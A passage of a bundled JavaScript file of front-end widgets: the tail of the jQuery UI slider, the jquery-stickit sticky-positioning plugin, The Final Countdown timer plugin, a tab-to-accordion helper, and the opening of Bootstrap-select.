                left: "",
                bottom: ""
            }) : (this.range = t("<div></div>").appendTo(this.element),
            i = "ui-slider-range ui-widget-header ui-corner-all"),
            this.range.addClass(i + ("min" === e.range || "max" === e.range ? " ui-slider-range-" + e.range : ""))) : (this.range && this.range.remove(),
            this.range = null)
        },
        _setupEvents: function() {
            var t = this.handles.add(this.range).filter("a");
            this._off(t),
            this._on(t, this._handleEvents),
            this._hoverable(t),
            this._focusable(t)
        },
        _destroy: function() {
            this.handles.remove(),
            this.range && this.range.remove(),
            this.element.removeClass("ui-slider ui-slider-horizontal ui-slider-vertical ui-widget ui-widget-content ui-corner-all"),
            this._mouseDestroy()
        },
        _mouseCapture: function(e) {
            var i, s, n, a, o, r, l, h, u = this, c = this.options;
            return c.disabled ? !1 : (this.elementSize = {
                width: this.element.outerWidth(),
                height: this.element.outerHeight()
            },
            this.elementOffset = this.element.offset(),
            i = {
                x: e.pageX,
                y: e.pageY
            },
            s = this._normValueFromMouse(i),
            n = this._valueMax() - this._valueMin() + 1,
            this.handles.each(function(e) {
                var i = Math.abs(s - u.values(e));
                (n > i || n === i && (e === u._lastChangedValue || u.values(e) === c.min)) && (n = i,
                a = t(this),
                o = e)
            }),
            r = this._start(e, o),
            r === !1 ? !1 : (this._mouseSliding = !0,
            this._handleIndex = o,
            a.addClass("ui-state-active").focus(),
            l = a.offset(),
            h = !t(e.target).parents().addBack().is(".ui-slider-handle"),
            this._clickOffset = h ? {
                left: 0,
                top: 0
            } : {
                left: e.pageX - l.left - a.width() / 2,
                top: e.pageY - l.top - a.height() / 2 - (parseInt(a.css("borderTopWidth"), 10) || 0) - (parseInt(a.css("borderBottomWidth"), 10) || 0) + (parseInt(a.css("marginTop"), 10) || 0)
            },
            this.handles.hasClass("ui-state-hover") || this._slide(e, o, s),
            this._animateOff = !0,
            !0))
        },
        _mouseStart: function() {
            return !0
        },
        _mouseDrag: function(t) {
            var e = {
                x: t.pageX,
                y: t.pageY
            }
              , i = this._normValueFromMouse(e);
            return this._slide(t, this._handleIndex, i),
            !1
        },
        _mouseStop: function(t) {
            return this.handles.removeClass("ui-state-active"),
            this._mouseSliding = !1,
            this._stop(t, this._handleIndex),
            this._change(t, this._handleIndex),
            this._handleIndex = null,
            this._clickOffset = null,
            this._animateOff = !1,
            !1
        },
        _detectOrientation: function() {
            this.orientation = "vertical" === this.options.orientation ? "vertical" : "horizontal"
        },
        _normValueFromMouse: function(t) {
            var e, i, s, n, a;
            return "horizontal" === this.orientation ? (e = this.elementSize.width,
            i = t.x - this.elementOffset.left - (this._clickOffset ? this._clickOffset.left : 0)) : (e = this.elementSize.height,
            i = t.y - this.elementOffset.top - (this._clickOffset ? this._clickOffset.top : 0)),
            s = i / e,
            s > 1 && (s = 1),
            0 > s && (s = 0),
            "vertical" === this.orientation && (s = 1 - s),
            n = this._valueMax() - this._valueMin(),
            a = this._valueMin() + s * n,
            this._trimAlignValue(a)
        },
        _start: function(t, e) {
            var i = {
                handle: this.handles[e],
                value: this.value()
            };
            return this.options.values && this.options.values.length && (i.value = this.values(e),
            i.values = this.values()),
            this._trigger("start", t, i)
        },
        _slide: function(t, e, i) {
            var s, n, a;
            this.options.values && this.options.values.length ? (s = this.values(e ? 0 : 1),
            2 === this.options.values.length && this.options.range === !0 && (0 === e && i > s || 1 === e && s > i) && (i = s),
            i !== this.values(e) && (n = this.values(),
            n[e] = i,
            a = this._trigger("slide", t, {
                handle: this.handles[e],
                value: i,
                values: n
            }),
            s = this.values(e ? 0 : 1),
            a !== !1 && this.values(e, i))) : i !== this.value() && (a = this._trigger("slide", t, {
                handle: this.handles[e],
                value: i
            }),
            a !== !1 && this.value(i))
        },
        _stop: function(t, e) {
            var i = {
                handle: this.handles[e],
                value: this.value()
            };
            this.options.values && this.options.values.length && (i.value = this.values(e),
            i.values = this.values()),
            this._trigger("stop", t, i)
        },
        _change: function(t, e) {
            if (!this._keySliding && !this._mouseSliding) {
                var i = {
                    handle: this.handles[e],
                    value: this.value()
                };
                this.options.values && this.options.values.length && (i.value = this.values(e),
                i.values = this.values()),
                this._lastChangedValue = e,
                this._trigger("change", t, i)
            }
        },
        value: function(t) {
            return arguments.length ? (this.options.value = this._trimAlignValue(t),
            this._refreshValue(),
            this._change(null, 0),
            undefined) : this._value()
        },
        values: function(e, i) {
            var s, n, a;
            if (arguments.length > 1)
                return this.options.values[e] = this._trimAlignValue(i),
                this._refreshValue(),
                this._change(null, e),
                undefined;
            if (!arguments.length)
                return this._values();
            if (!t.isArray(arguments[0]))
                return this.options.values && this.options.values.length ? this._values(e) : this.value();
            for (s = this.options.values,
            n = arguments[0],
            a = 0; s.length > a; a += 1)
                s[a] = this._trimAlignValue(n[a]),
                this._change(null, a);
            this._refreshValue()
        },
        _setOption: function(e, i) {
            var s, n = 0;
            switch ("range" === e && this.options.range === !0 && ("min" === i ? (this.options.value = this._values(0),
            this.options.values = null) : "max" === i && (this.options.value = this._values(this.options.values.length - 1),
            this.options.values = null)),
            t.isArray(this.options.values) && (n = this.options.values.length),
            t.Widget.prototype._setOption.apply(this, arguments),
            e) {
            case "orientation":
                this._detectOrientation(),
                this.element.removeClass("ui-slider-horizontal ui-slider-vertical").addClass("ui-slider-" + this.orientation),
                this._refreshValue();
                break;
            case "value":
                this._animateOff = !0,
                this._refreshValue(),
                this._change(null, 0),
                this._animateOff = !1;
                break;
            case "values":
                for (this._animateOff = !0,
                this._refreshValue(),
                s = 0; n > s; s += 1)
                    this._change(null, s);
                this._animateOff = !1;
                break;
            case "min":
            case "max":
                this._animateOff = !0,
                this._refreshValue(),
                this._animateOff = !1;
                break;
            case "range":
                this._animateOff = !0,
                this._refresh(),
                this._animateOff = !1
            }
        },
        _value: function() {
            var t = this.options.value;
            return t = this._trimAlignValue(t)
        },
        _values: function(t) {
            var e, i, s;
            if (arguments.length)
                return e = this.options.values[t],
                e = this._trimAlignValue(e);
            if (this.options.values && this.options.values.length) {
                for (i = this.options.values.slice(),
                s = 0; i.length > s; s += 1)
                    i[s] = this._trimAlignValue(i[s]);
                return i
            }
            return []
        },
        _trimAlignValue: function(t) {
            if (this._valueMin() >= t)
                return this._valueMin();
            if (t >= this._valueMax())
                return this._valueMax();
            var e = this.options.step > 0 ? this.options.step : 1
              , i = (t - this._valueMin()) % e
              , s = t - i;
            return 2 * Math.abs(i) >= e && (s += i > 0 ? e : -e),
            parseFloat(s.toFixed(5))
        },
        _valueMin: function() {
            return this.options.min
        },
        _valueMax: function() {
            return this.options.max
        },
        _refreshValue: function() {
            var e, i, s, n, a, o = this.options.range, r = this.options, l = this, h = this._animateOff ? !1 : r.animate, u = {};
            this.options.values && this.options.values.length ? this.handles.each(function(s) {
                i = 100 * ((l.values(s) - l._valueMin()) / (l._valueMax() - l._valueMin())),
                u["horizontal" === l.orientation ? "left" : "bottom"] = i + "%",
                t(this).stop(1, 1)[h ? "animate" : "css"](u, r.animate),
                l.options.range === !0 && ("horizontal" === l.orientation ? (0 === s && l.range.stop(1, 1)[h ? "animate" : "css"]({
                    left: i + "%"
                }, r.animate),
                1 === s && l.range[h ? "animate" : "css"]({
                    width: i - e + "%"
                }, {
                    queue: !1,
                    duration: r.animate
                })) : (0 === s && l.range.stop(1, 1)[h ? "animate" : "css"]({
                    bottom: i + "%"
                }, r.animate),
                1 === s && l.range[h ? "animate" : "css"]({
                    height: i - e + "%"
                }, {
                    queue: !1,
                    duration: r.animate
                }))),
                e = i
            }) : (s = this.value(),
            n = this._valueMin(),
            a = this._valueMax(),
            i = a !== n ? 100 * ((s - n) / (a - n)) : 0,
            u["horizontal" === this.orientation ? "left" : "bottom"] = i + "%",
            this.handle.stop(1, 1)[h ? "animate" : "css"](u, r.animate),
            "min" === o && "horizontal" === this.orientation && this.range.stop(1, 1)[h ? "animate" : "css"]({
                width: i + "%"
            }, r.animate),
            "max" === o && "horizontal" === this.orientation && this.range[h ? "animate" : "css"]({
                width: 100 - i + "%"
            }, {
                queue: !1,
                duration: r.animate
            }),
            "min" === o && "vertical" === this.orientation && this.range.stop(1, 1)[h ? "animate" : "css"]({
                height: i + "%"
            }, r.animate),
            "max" === o && "vertical" === this.orientation && this.range[h ? "animate" : "css"]({
                height: 100 - i + "%"
            }, {
                queue: !1,
                duration: r.animate
            }))
        },
        _handleEvents: {
            keydown: function(i) {
                var s, n, a, o, r = t(i.target).data("ui-slider-handle-index");
                switch (i.keyCode) {
                case t.ui.keyCode.HOME:
                case t.ui.keyCode.END:
                case t.ui.keyCode.PAGE_UP:
                case t.ui.keyCode.PAGE_DOWN:
                case t.ui.keyCode.UP:
                case t.ui.keyCode.RIGHT:
                case t.ui.keyCode.DOWN:
                case t.ui.keyCode.LEFT:
                    if (i.preventDefault(),
                    !this._keySliding && (this._keySliding = !0,
                    t(i.target).addClass("ui-state-active"),
                    s = this._start(i, r),
                    s === !1))
                        return
                }
                switch (o = this.options.step,
                n = a = this.options.values && this.options.values.length ? this.values(r) : this.value(),
                i.keyCode) {
                case t.ui.keyCode.HOME:
                    a = this._valueMin();
                    break;
                case t.ui.keyCode.END:
                    a = this._valueMax();
                    break;
                case t.ui.keyCode.PAGE_UP:
                    a = this._trimAlignValue(n + (this._valueMax() - this._valueMin()) / e);
                    break;
                case t.ui.keyCode.PAGE_DOWN:
                    a = this._trimAlignValue(n - (this._valueMax() - this._valueMin()) / e);
                    break;
                case t.ui.keyCode.UP:
                case t.ui.keyCode.RIGHT:
                    if (n === this._valueMax())
                        return;
                    a = this._trimAlignValue(n + o);
                    break;
                case t.ui.keyCode.DOWN:
                case t.ui.keyCode.LEFT:
                    if (n === this._valueMin())
                        return;
                    a = this._trimAlignValue(n - o)
                }
                this._slide(i, r, a)
            },
            click: function(t) {
                t.preventDefault()
            },
            keyup: function(e) {
                var i = t(e.target).data("ui-slider-handle-index");
                this._keySliding && (this._keySliding = !1,
                this._stop(e, i),
                this._change(e, i),
                t(e.target).removeClass("ui-state-active"))
            }
        }
    })
}
)(jQuery);
(function($) {
    var KEY = 'jquery-stickit';
    var SPACER_KEY = KEY + '-spacer';
    var SELECTOR = ':' + KEY;
    var IE7 = navigator.userAgent.indexOf('MSIE 7.0') != -1;
    var OFFSET = IE7 ? -2 : 0;
    var LOCATIING_KEY = KEY + '-locating';
    var MUTATION = window.MutationObserver !== undefined;
    var animationend = 'animationend webkitAnimationEnd oAnimationEnd';
    var transitionend = 'transitionend webkitTransitionEnd oTransitionEnd';
    var fullscreenchange = 'webkitfullscreenchange mozfullscreenchange fullscreenchange MSFullscreenChange';
    var Scope = window.StickScope = {
        Parent: 0,
        Document: 1
    };
    var Stick = {
        None: 0,
        Fixed: 1,
        Absolute: 2
    };
    var init = false;
    function throttle(func) {
        var delay = 10;
        var lastTime = 0;
        var timer;
        return function() {
            var self = this
              , args = arguments;
            var exec = function() {
                lastTime = new Date();
                func.apply(self, args);
            };
            if (timer) {
                clearTimeout(timer);
                timer = null;
            }
            var diff = new Date() - lastTime;
            if (diff > delay) {
                exec();
            } else {
                timer = setTimeout(exec, delay - diff);
            }
        }
        ;
    }
    $.expr[':'][KEY] = function(element) {
        return !!$(element).data(KEY);
    }
    ;
    function Sticker(element, optionList) {
        this.element = $(element);
        this.lastValues = {};
        if (!$.isArray(optionList)) {
            optionList = [optionList || {}];
        }
        if (!optionList.length) {
            optionList.push({});
        }
        this.optionList = optionList;
        var transform = this.element.css('transform') || '';
        this.defaultZIndex = this.element.css('z-index') || 100;
        if (this.defaultZIndex == 'auto') {
            this.defaultZIndex = 100;
        } else if (this.defaultZIndex == '0' && transform != 'none') {
            this.defaultZIndex = 100;
        }
        this.updateOptions();
        this.offsetY = 0;
        this.lastY = 0;
        this.stick = Stick.None;
        this.spacer = $('<div />');
        this.spacer[0].id = element.id;
        this.spacer[0].className = element.className;
        this.spacer[0].style.cssText = element.style.cssText;
        this.spacer.addClass(SPACER_KEY);
        this.spacer[0].style.cssText += ';visibility: hidden !important;display: none !important';
        this.spacer.insertAfter(this.element);
        if (this.element.parent().css('position') == 'static') {
            this.element.parent().css('position', 'relative');
        }
        this.origWillChange = this.element.css('will-change');
        if (this.origWillChange == 'auto') {
            this.element.css('will-change', 'transform');
        }
        if (transform == 'none') {
            this.element.css('transform', 'translateZ(0)');
        } else if (transform.indexOf('matrix3d') == -1) {
            this.element.css('transform', this.element.css('transform') + ' translateZ(0)');
        }
        this.bound();
        this.precalculate();
        this.store();
    }
    Sticker.prototype.trigger = function(eventName) {
        var name = 'on' + eventName.charAt(0).toUpperCase() + eventName.slice(1);
        if (this.options[name]) {
            this.options[name].call(this.element);
        }
        this.element.trigger('stickit:' + eventName);
    }
    ;
    Sticker.prototype.isActive = function(options) {
        return (options.screenMinWidth === undefined || screenWidth >= options.screenMinWidth) && (options.screenMaxWidth === undefined || screenWidth <= options.screenMaxWidth);
    }
    ;
    Sticker.prototype.updateCss = function(options) {
        if (this.element.hasClass(this.options.className) && options.className != this.options.className) {
            this.element.removeClass(this.options.className).addClass(options.className);
        }
        var update = {};
        if (this.stick == Stick.Absolute) {
            if (this.options.extraHeight != options.extraHeight) {
                update.bottom = -this.options.extraHeight + 'px';
            }
        } else {
            if (this.options.top != options.top) {
                update.top = (options.top + this.offsetY) + 'px';
            }
        }
        if (this.options.zIndex != options.zIndex) {
            update.zIndex = this.getZIndex(options);
        }
        this.element.css(update);
    }
    ;
    Sticker.prototype.updateOptions = function() {
        var activeKey = this.getActiveOptionsKey();
        if (this.activeKey == activeKey) {
            return;
        }
        this.activeKey = activeKey;
        var options = this.getActiveOptions();
        if (this.options) {
            if (!activeKey) {
                this.reset();
            } else if (this.stick != Stick.None) {
                if (options.scope == this.options.scope) {
                    this.updateCss(options);
                } else {
                    this.reset();
                    setTimeout(this.locate.bind(this));
                }
            }
        }
        this.options = options;
        this.zIndex = this.getZIndex(options);
    }
    ;
    Sticker.prototype.getZIndex = function(options) {
        return options.zIndex === undefined ? this.defaultZIndex : options.zIndex;
    }
    ;
    Sticker.prototype.getActiveOptionsKey = function() {
        var indices = [];
        for (var i = 0; i < this.optionList.length; ++i) {
            if (this.isActive(this.optionList[i])) {
                indices.push(i);
            }
        }
        return indices.join('_');
    }
    ;
    Sticker.prototype.getActiveOptions = function() {
        var options = {};
        for (var i = 0; i < this.optionList.length; ++i) {
            var opt = this.optionList[i];
            if (this.isActive(opt)) {
                $.extend(options, opt);
            }
        }
        options.scope = options.scope || Scope.Parent;
        options.className = options.className || 'stick';
        options.top = options.top || 0;
        options.extraHeight = options.extraHeight || 0;
        if (options.overflowScrolling === undefined) {
            options.overflowScrolling = true;
        }
        return options;
    }
    ;
    Sticker.prototype.store = function() {
        var element = this.element[0];
        this.origStyle = {
            width: element.style.width,
            position: element.style.position,
            left: element.style.left,
            top: element.style.top,
            bottom: element.style.bottom,
            zIndex: element.style.zIndex
        };
    }
    ;
    Sticker.prototype.restore = function() {
        this.element.css(this.origStyle);
    }
    ;
    Sticker.prototype.bound = function() {
        var element = this.element;
        if (!IE7 && element.css('box-sizing') == 'border-box') {
            var bl = parseFloat(element.css('border-left-width')) || 0;
            var br = parseFloat(element.css('border-right-width')) || 0;
            var pl = parseFloat(element.css('padding-left')) || 0;
            var pr = parseFloat(element.css('padding-right')) || 0;
            this.extraWidth = bl + br + pl + pr;
        } else {
            this.extraWidth = 0;
        }
        this.margin = {
            top: parseFloat(element.css('margin-top')) || 0,
            bottom: parseFloat(element.css('margin-bottom')) || 0,
            left: parseFloat(element.css('margin-left')) || 0,
            right: parseFloat(element.css('margin-right')) || 0
        };
        this.parent = {
            border: {
                bottom: parseFloat(element.parent().css('border-bottom-width')) || 0
            }
        };
    }
    ;
    Sticker.prototype.precalculate = function() {
        this.baseTop = this.margin.top + this.options.top;
        this.basePadding = this.baseTop + this.margin.bottom;
        this.baseParentOffset = this.options.extraHeight - this.parent.border.bottom;
        this.offsetHeight = this.options.overflowScrolling ? Math.max(this.element.outerHeight(false) + this.basePadding - screenHeight, 0) : 0;
        this.minOffsetHeight = -this.offsetHeight;
    }
    ;
    Sticker.prototype.reset = function() {
        if (this.stick == Stick.Absolute) {
            this.trigger('unend');
            this.trigger('unstick');
        } else if (this.stick == Stick.Fixed) {
            this.trigger('unstick');
        }
        this.stick = Stick.None;
        this.spacer.css('width', this.origStyle.width);
        this.spacer[0].style.cssText += ';display: none !important';
        this.restore();
        this.element.removeClass(this.options.className);
    }
    ;
    Sticker.prototype.setAbsolute = function(left) {
        if (this.stick == Stick.None) {
            this.element.addClass(this.options.className);
            this.trigger('stick');
            this.trigger('end');
        } else {
            this.trigger('end');
        }
        this.stick = Stick.Absolute;
        this.element.css({
            width: this.element.width() + this.extraWidth + 'px',
            position: 'absolute',
            top: this.origStyle.top,
            left: left + 'px',
            bottom: -this.options.extraHeight + 'px',
            'z-index': this.zIndex
        });
    }
    ;
    Sticker.prototype.setFixed = function(left, lastY, offsetY) {
        if (this.stick == Stick.None) {
            this.element.addClass(this.options.className);
            this.trigger('stick');
        } else {
            this.trigger('unend');
        }
        if (!this.options.overflowScrolling) {
            offsetY = 0;
        }
        this.stick = Stick.Fixed;
        this.lastY = lastY;
        this.offsetY = offsetY;
        this.element.css({
            width: this.element.width() + this.extraWidth + 'px',
            position: 'fixed',
            top: (this.options.top + offsetY) + 'px',
            left: left + 'px',
            bottom: this.origStyle.bottom,
            'z-index': this.zIndex
        });
    }
    ;
    Sticker.prototype.updateScroll = function(newY) {
        if (this.offsetHeight == 0 || !this.options.overflowScrolling) {
            return;
        }
        var offsetY = Math.max(this.offsetY + newY - this.lastY, this.minOffsetHeight);
        offsetY = Math.min(offsetY, 0);
        this.lastY = newY;
        if (this.offsetY == offsetY) {
            return;
        }
        this.offsetY = offsetY;
        this.element.css('top', (this.options.top + this.offsetY) + 'px');
    }
    ;
    Sticker.prototype.isHigher = function() {
        return this.options.scope == Scope.Parent && this.element.parent().height() <= this.element.outerHeight(false) + this.basePadding;
    }
    ;
    Sticker.prototype.locate = function() {
        if (!this.activeKey) {
            return;
        }
        var rect, top, left, element = this.element, spacer = this.spacer;
        element.data(LOCATIING_KEY, true);
        switch (this.stick) {
        case Stick.Fixed:
            rect = spacer[0].getBoundingClientRect();
            top = rect.top - this.baseTop;
            if (top >= 0 || this.isHigher()) {
                this.reset();
            } else if (this.options.scope == Scope.Parent) {
                rect = element.parent()[0].getBoundingClientRect();
                if (rect.bottom + this.baseParentOffset + this.offsetHeight <= element.outerHeight(false) + this.basePadding) {
                    this.setAbsolute(this.spacer.position().left);
                } else {
                    this.updateScroll(rect.bottom);
                }
            } else {
                this.updateScroll(rect.bottom);
            }
            break;
        case Stick.Absolute:
            rect = spacer[0].getBoundingClientRect();
            top = rect.top - this.baseTop;
            left = rect.left - this.margin.left;
            if (top >= 0 || this.isHigher()) {
                this.reset();
            } else {
                rect = element.parent()[0].getBoundingClientRect();
                if (rect.bottom + this.baseParentOffset + this.offsetHeight > element.outerHeight(false) + this.basePadding) {
                    this.setFixed(left + OFFSET, rect.bottom, -this.offsetHeight);
                }
            }
            break;
        case Stick.None:
        default:
            rect = element[0].getBoundingClientRect();
            top = rect.top - this.baseTop;
            if (top >= 0 || this.isHigher()) {
                return;
            }
            var rect2 = element.parent()[0].getBoundingClientRect();
            spacer.height(element.height());
            spacer.show();
            left = rect.left - this.margin.left;
            if (this.options.scope == Scope.Document) {
                this.setFixed(left, rect.bottom, 0);
            } else {
                if (rect2.bottom + this.baseParentOffset + this.offsetHeight <= element.outerHeight(false) + this.basePadding) {
                    this.setAbsolute(this.element.position().left);
                } else {
                    this.setFixed(left + OFFSET, rect.bottom, 0);
                }
            }
            if (!spacer.width()) {
                spacer.width(element.width());
            }
            break;
        }
    }
    ;
    Sticker.prototype.refresh = function() {
        this.updateOptions();
        this.bound();
        this.precalculate();
        if (this.stick == Stick.None) {
            this.locate();
            return;
        }
        var element = this.element;
        var spacer = this.spacer;
        if (this.lastValues.width != spacer.width()) {
            element.width(this.lastValues.width = spacer.width());
        }
        if (this.lastValues.height != spacer.height()) {
            spacer.height(this.lastValues.height = spacer.height());
        }
        if (this.stick == Stick.Fixed) {
            var rect = this.spacer[0].getBoundingClientRect();
            var left = rect.left - this.margin.left;
            if (this.lastValues.left != left + 'px') {
                element.css('left', this.lastValues.left = left + 'px');
            }
        }
        this.locate();
    }
    ;
    Sticker.prototype.destroy = function() {
        this.reset();
        this.spacer.remove();
        this.element.removeData(KEY);
    }
    ;
    Sticker.prototype.enableWillChange = function(enabled) {
        if (this.origWillChange != 'auto') {
            return;
        }
        this.element.css('will-change', enabled ? 'transform' : this.origWillChange);
    }
    ;
    var screenHeight, screenWidth;
    function resize() {
        screenHeight = window.innerHeight || document.documentElement.clientHeight;
        screenWidth = window.innerWidth || document.documentElement.clientWidth;
        refresh();
    }
    function refresh() {
        $(SELECTOR).each(function() {
            $(this).data(KEY).refresh();
        });
    }
    function scroll() {
        $(SELECTOR).each(function() {
            $(this).data(KEY).locate();
        });
    }
    ;function onFullscreenChange() {
        var fullscreen = !!(document.fullscreenElement || document.mozFullScreenElement || document.webkitFullscreenElement || document.msFullscreenElement);
        $(SELECTOR).each(function() {
            $(this).data(KEY).enableWillChange(!fullscreen);
        });
    }
    var throttleRefresh = throttle(refresh);
    function mutationUpdate(records) {
        var notAllLocating = records.some(function(record) {
            var element = $(record.target);
            var locating = element.data(LOCATIING_KEY);
            if (locating) {
                element.removeData(LOCATIING_KEY);
            }
            return !element.hasClass(SPACER_KEY) && !locating;
        });
        if (notAllLocating) {
            throttleRefresh();
        }
    }
    var PublicMethods = ['destroy', 'refresh'];
    $.fn.stickit = function(method, options) {
        if (typeof (method) == 'string') {
            if ($.inArray(method, PublicMethods) != -1) {
                var args = arguments;
                this.each(function() {
                    var sticker = $(this).data(KEY);
                    if (sticker) {
                        sticker[method].apply(sticker, Array.prototype.slice.call(args, 1));
                    }
                });
            }
        } else {
            if (!init) {
                init = true;
                resize();
                $(document).ready(function() {
                    $(window).bind('resize', resize).bind('scroll', scroll);
                    $(document.body).bind(animationend + ' ' + transitionend, scroll);
                    $(document).bind(fullscreenchange, onFullscreenChange);
                });
                if (MUTATION) {
                    var observer = new MutationObserver(mutationUpdate);
                    observer.observe(document, {
                        attributes: true,
                        childList: true,
                        characterData: true,
                        subtree: true
                    });
                }
            }
            if ($.isArray(method)) {
                options = method;
            } else {
                options = Array.prototype.slice.call(arguments, 0);
            }
            this.each(function() {
                var sticker = new Sticker(this,options);
                $(this).data(KEY, sticker);
                sticker.locate();
            });
        }
        return this;
    }
    ;
    $.stickit = {
        refresh: refresh
    };
}
)(jQuery);
/*!
* The Final Countdown for jQuery v2.0.4 (http://hilios.github.io/jQuery.countdown/)
* Copyright (c) 2014 Edson Hilios
*
* Permission is hereby granted, free of charge, to any person obtaining a copy of
* this software and associated documentation files (the "Software"), to deal in
* the Software without restriction, including without limitation the rights to
* use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
* the Software, and to permit persons to whom the Software is furnished to do so,
* subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
* FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
* COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
* IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
* CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/
!function(a) {
    "use strict";
    "function" == typeof define && define.amd ? define(["jquery"], a) : a(jQuery)
}(function(a) {
    "use strict";
    function b(a) {
        if (a instanceof Date)
            return a;
        if (String(a).match(g))
            return String(a).match(/^[0-9]*$/) && (a = Number(a)),
            String(a).match(/\-/) && (a = String(a).replace(/\-/g, "/")),
            new Date(a);
        throw new Error("Couldn't cast `" + a + "` to a date object.")
    }
    function c(a) {
        return function(b) {
            var c = b.match(/%(-|!)?[A-Z]{1}(:[^;]+;)?/gi);
            if (c)
                for (var e = 0, f = c.length; f > e; ++e) {
                    var g = c[e].match(/%(-|!)?([a-zA-Z]{1})(:[^;]+;)?/)
                      , i = new RegExp(g[0])
                      , j = g[1] || ""
                      , k = g[3] || ""
                      , l = null;
                    g = g[2],
                    h.hasOwnProperty(g) && (l = h[g],
                    l = Number(a[l])),
                    null !== l && ("!" === j && (l = d(k, l)),
                    "" === j && 10 > l && (l = "0" + l.toString()),
                    b = b.replace(i, l.toString()))
                }
            return b = b.replace(/%%/, "%")
        }
    }
    function d(a, b) {
        var c = "s"
          , d = "";
        return a && (a = a.replace(/(:|;|\s)/gi, "").split(/\,/),
        1 === a.length ? c = a[0] : (d = a[0],
        c = a[1])),
        1 === Math.abs(b) ? d : c
    }
    var e = 100
      , f = []
      , g = [];
    g.push(/^[0-9]*$/.source),
    g.push(/([0-9]{1,2}\/){2}[0-9]{4}( [0-9]{1,2}(:[0-9]{2}){2})?/.source),
    g.push(/[0-9]{4}([\/\-][0-9]{1,2}){2}( [0-9]{1,2}(:[0-9]{2}){2})?/.source),
    g = new RegExp(g.join("|"));
    var h = {
        Y: "years",
        m: "months",
        w: "weeks",
        d: "days",
        D: "totalDays",
        H: "hours",
        M: "minutes",
        S: "seconds"
    }
      , i = function(b, c, d) {
        this.el = b,
        this.$el = a(b),
        this.interval = null,
        this.offset = {},
        this.instanceNumber = f.length,
        f.push(this),
        this.$el.data("countdown-instance", this.instanceNumber),
        d && (this.$el.on("update.countdown", d),
        this.$el.on("stoped.countdown", d),
        this.$el.on("finish.countdown", d)),
        this.setFinalDate(c),
        this.start()
    };
    a.extend(i.prototype, {
        start: function() {
            null !== this.interval && clearInterval(this.interval);
            var a = this;
            this.update(),
            this.interval = setInterval(function() {
                a.update.call(a)
            }, e)
        },
        stop: function() {
            clearInterval(this.interval),
            this.interval = null,
            this.dispatchEvent("stoped")
        },
        pause: function() {
            this.stop.call(this)
        },
        resume: function() {
            this.start.call(this)
        },
        remove: function() {
            this.stop(),
            f[this.instanceNumber] = null,
            delete this.$el.data().countdownInstance
        },
        setFinalDate: function(a) {
            this.finalDate = b(a)
        },
        update: function() {
            return 0 === this.$el.closest("html").length ? void this.remove() : (this.totalSecsLeft = this.finalDate.getTime() - (new Date).getTime(),
            this.totalSecsLeft = Math.ceil(this.totalSecsLeft / 1e3),
            this.totalSecsLeft = this.totalSecsLeft < 0 ? 0 : this.totalSecsLeft,
            this.offset = {
                seconds: this.totalSecsLeft % 60,
                minutes: Math.floor(this.totalSecsLeft / 60) % 60,
                hours: Math.floor(this.totalSecsLeft / 60 / 60) % 24,
                days: Math.floor(this.totalSecsLeft / 60 / 60 / 24) % 7,
                totalDays: Math.floor(this.totalSecsLeft / 60 / 60 / 24),
                weeks: Math.floor(this.totalSecsLeft / 60 / 60 / 24 / 7),
                months: Math.floor(this.totalSecsLeft / 60 / 60 / 24 / 30),
                years: Math.floor(this.totalSecsLeft / 60 / 60 / 24 / 365)
            },
            void (0 === this.totalSecsLeft ? (this.stop(),
            this.dispatchEvent("finish")) : this.dispatchEvent("update")))
        },
        dispatchEvent: function(b) {
            var d = a.Event(b + ".countdown");
            d.finalDate = this.finalDate,
            d.offset = a.extend({}, this.offset),
            d.strftime = c(this.offset),
            this.$el.trigger(d)
        }
    }),
    a.fn.countdown = function() {
        var b = Array.prototype.slice.call(arguments, 0);
        return this.each(function() {
            var c = a(this).data("countdown-instance");
            if (void 0 !== c) {
                var d = f[c]
                  , e = b[0];
                i.prototype.hasOwnProperty(e) ? d[e].apply(d, b.slice(1)) : null === String(e).match(/^[$A-Z_][0-9A-Z_$]*$/i) ? (d.setFinalDate.call(d, e),
                d.start()) : a.error("Method %s does not exist on jQuery.countdown".replace(/\%s/gi, e))
            } else
                new i(this,b[0],b[1])
        })
    }
});
function getAccordion(element_id, screen) {
    $(window).resize(function() {
        location.reload();
    });
    if ($(window).width() < screen) {
        var concat = '';
        obj_tabs = $(element_id + " li").toArray();
        obj_cont = $(".tab-content .tab-pane").toArray();
        jQuery.each(obj_tabs, function(n, val) {
            concat += '<div id="' + n + '" class="panel panel-default">';
            concat += '<div class="panel-heading" role="tab" id="heading' + n + '">';
            concat += '<h4 class="panel-title"><a role="button" data-toggle="collapse" data-parent="#accordion" href="#collapse' + n + '" aria-expanded="false" aria-controls="collapse' + n + '">' + val.innerText + '</a></h4>';
            concat += '</div>';
            concat += '<div id="collapse' + n + '" class="panel-collapse collapse" role="tabpanel" aria-labelledby="heading' + n + '">';
            concat += '<div class="panel-body">' + obj_cont[n].innerHTML + '</div>';
            concat += '</div>';
            concat += '</div>';
        });
        $("#accordion").html(concat);
        $("#accordion").find('.panel-collapse:first').addClass("in");
        $("#accordion").find('.panel-title a:first').attr("aria-expanded", "true");
        $(element_id).remove();
        $(".tab-content").remove();
    }
}
/*!
* Bootstrap-select v1.13.18 (https://developer.snapappointments.com/bootstrap-select)
*
* Copyright 2012-2020 SnapAppointments, LLC
* Licensed under MIT (https://github.com/snapappointments/bootstrap-select/blob/master/LICENSE)
*/
!function(e, t) {
    void 0 === e && void 0 !== window && (e = window),
    "function" == typeof define && define.amd ? define(["jquery"], function(e) {
        return t(e)
    }) : "object" == typeof module && module.exports ? module.exports = t(require("jquery")) : t(e.jQuery)
}(this, function(e) {
    !function(P) {
        "use strict";
        var d = ["sanitize", "whiteList", "sanitizeFn"]
          , r = ["background", "cite", "href", "itemtype", "longdesc", "poster", "src", "xlink:href"]
          , e = {
